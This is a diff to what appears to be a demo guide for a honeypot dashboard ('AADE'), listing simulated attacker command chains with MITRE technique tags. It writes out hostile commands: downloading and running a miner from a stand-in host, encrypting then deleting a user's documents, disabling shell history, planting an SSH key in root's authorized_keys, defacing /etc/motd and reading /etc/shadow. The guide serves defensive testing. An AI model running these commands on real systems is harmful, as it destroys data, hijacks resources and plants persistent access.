@@ -153,3 +153,36 @@ curl -LO http://miner.pool/xmrig; ./xmrig -o pool.supportxmr.com:443 -u 4...
 ```
 - **TTP:** T1496 (Resource Hijacking)
 - **Explanation:** Downloading and running a miner to monetize the compromise.
+
+## 🚀 Advanced Attack Chains (The "Showcase" Collection)
+
+Use these logical sequences to demonstrate how the **AADE Dashboard** tracks an evolving intrusion.
+
+### Chain A: The "Ransomware Specialist"
+1. **Recon:** `ls -R /home`
+2. **Exfil Prep:** `tar -cvf backup.tar /home/phil/documents`
+3. **Encryption (Impact):** `gpg --symmetric --cipher-algo AES256 backup.tar`
+4. **Cleanup:** `rm backup.tar; rm -rf /home/phil/documents`
+- **Dashboard Effect:** Triggers T1486 (Data Encrypted for Impact) and multi-vector tags on the same IP profile.
+
+### Chain B: The "Crypto-Miner"
+1. **Persistence:** `nohup wget http://miner.pool/linux_miner -O /tmp/miner && chmod +x /tmp/miner && ./tmp/miner &`
+2. **Hide Info:** `rm /tmp/miner` (after execution starts)
+- **Dashboard Effect:** Triggers T1496 (Resource Hijacking) and shows the "GHOST_REPLY" if the LLM simulates a successful background process.
+
+### Chain C: "Defacing & Evasion"
+1. **Defense Evasion:** `unset HISTFILE; export HISTSIZE=0`
+2. **Persistence:** `echo "ssh-rsa AAAAB3N..." >> /root/.ssh/authorized_keys`
+3. **Impact (Deface):** `echo "HACKED BY AADE" > /etc/motd`
+- **Dashboard Effect:** Triggers Account Manipulation and Indicator Removal.
+
+## 🧠 Triggering "Adaptive Deception" (MicroVM Shift)
+
+The **Adaptive Plane** shifts to a real Firecracker MicroVM when it detects a command that is too complex for the Low-Interaction shell to handle safely.
+
+**To trigger the shift, run:**
+```bash
+# Anything involving complex piping or specialized binaries
+cat /etc/shadow | grep root | awk -F: '{print $1}'
+```
+- **Dashboard Effect:** You will see the **"MicroVM Active"** indicator turn Green and the **Mode** switch to **ADAPTIVE (High Interaction)**.
